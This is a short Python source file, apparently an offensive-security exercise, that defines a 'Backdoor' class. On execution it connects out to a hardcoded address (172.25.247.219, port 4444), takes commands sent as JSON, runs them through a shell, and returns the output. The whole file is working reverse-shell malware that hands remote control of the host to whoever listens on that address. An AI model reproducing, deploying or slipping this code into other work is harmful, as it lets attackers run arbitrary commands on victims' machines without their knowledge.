import socket
import subprocess
import json

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        # self.connection.send(b'Hello, Server!\n')

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data.decode() if isinstance(data, bytes) else data)
            self.connection.send(json_data.encode())
        except Exception as e:
            print(f"Error in reliable_send: {e}")

    def reliable_receive(self):
        try:
            json_data = self.connection.recv(4096).decode()
            return json.loads(json_data)
        except Exception as e:
            print(f"Error in reliable_receive: {e}")
            return None

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError as e:
            return f"Command failed: {e.output.decode()}".encode()

    def run(self):
        while True:
            command = self.reliable_receive()
            if command is None:
                break
            if command.lower() == "exit":
                self.connection.close()
                break
            command_result = self.execute_system_command(command)
            self.reliable_send(command_result)

        self.connection.close()

my_backdoor = Backdoor("172.25.247.219", 4444)
my_backdoor.run()